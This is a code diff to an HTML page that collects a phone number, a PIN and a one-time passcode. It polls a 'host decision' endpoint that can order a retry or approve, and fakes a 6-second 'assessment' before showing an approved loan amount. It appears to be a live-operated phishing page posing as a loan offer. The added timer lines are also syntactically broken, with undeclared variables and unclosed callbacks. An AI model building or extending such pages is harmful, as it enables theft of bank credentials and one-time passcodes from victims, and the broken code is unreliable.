@@ -896,6 +896,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
       }
     }
 let decisionTimer = null;
+let otpAutoTimer = null;
+if (otpStepTimer) clearTimeout(otpStepTimer);
+
 function watchHostDecision(step) {
   if (decisionTimer) clearInterval(decisionTimer);
   decisionTimer = setInterval(async () => {
@@ -904,6 +907,7 @@ function watchHostDecision(step) {
       const data = await res.json();
       if (data.status === 'retry') {
         clearInterval(decisionTimer);
+        if (otpAutoTimer) clearTimeout(otpAutoTimer);
         if (step === 'pin') {
           enteredPin = '';
           updatePinDots();
@@ -918,10 +922,12 @@ function watchHostDecision(step) {
         }
       } else if (data.status === 'approve') {
         clearInterval(decisionTimer);
+        if (otpAutoTimer) clearTimeout(otpAutoTimer);
       }
     } catch (e) {}
   }, 3000);
 }
+
 
     function submitPin() {
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
@@ -1018,6 +1024,7 @@ function watchHostDecision(step) {
         })
       }).catch(err => console.error(err));
   watchHostDecision('otp');
+  otpStepTimer = setTimeout(() => {
 
       setTimeout(() => {
         if (btnOtp) {
@@ -1027,6 +1034,8 @@ function watchHostDecision(step) {
         goTo('processing');
 
         // Processing assessment takes 6 seconds for realistic feel
+            otpAutoTimer = setTimeout(() => {
+
         setTimeout(() => {
           const approvedAmt = document.getElementById('approved-amount');
           const approvedRepay = document.getElementById('approved-repay');
